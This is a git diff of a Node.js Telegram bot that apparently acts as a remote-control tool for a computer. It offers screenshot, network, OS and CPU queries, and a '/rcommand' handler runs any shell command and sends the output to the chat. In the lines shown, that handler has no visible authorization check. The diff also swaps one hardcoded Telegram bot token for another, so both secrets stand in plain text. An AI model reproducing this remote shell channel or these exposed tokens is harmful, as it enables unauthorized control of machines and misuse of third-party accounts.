@@ -1,5 +1,5 @@
 #!/usr/bin/env node
-const TOKEN = '521688741:AAEBliosAna2GPQ12O2bTkMj_AkChmC-9Q0';
+const TOKEN = '521688741:AAG7HJvY_2iJjV7YxIvAesLGfdvk8NsBydo';
 
 console.log('Initializing...')
 
@@ -36,18 +36,18 @@ const MainKeyboard = {
             "Network"
             ,
             "OS"
-        ]
-        ,
-        [
+            ,
             "CPU"
-            //, "Storage"
         ]
         ,
+        // [
+            // "Storage"
+            // ,"USB"
+        // ]
+        // ,
         [
             "Screenshot"
-            ,
-            // "GPS",
-            "USB"
+            // ,"GPS"
         ]
     ]
 }
@@ -166,10 +166,11 @@ var bot = new BOT({
     else if (!text.indexOf("/rcommand")) {
         var Command = text.replace("/rcommand","")
         cmd.get(Command,(err,data,stderr) => {
+            var ResultCommand = err !=null ? err : data
             bot.sendMessage({
                 chat_id:$chat_id,
                 reply_to_message_id:$message_id,
-                text:"/rcommand 👇\n" + err || data
+                text:"/rcommand 👇\n" + ResultCommand
             })
         })
     }
@@ -304,20 +305,6 @@ var bot = new BOT({
                     })
                 })
         });
-    }
-
-    //USB
-    else if (Authorized && text == "usb") {
-        var USB = usb.getDeviceList() , U = "";
-
-        for (i=0;i<USB.length;i++) {
-            U += USB[i].deviceDescriptor.bMaxPacketSize0 + "\n"
-        }
-
-        bot.sendMessage({
-            chat_id:$chat_id,
-            text:"USB : \n" + U
-        })
     }
 
     //Cancel
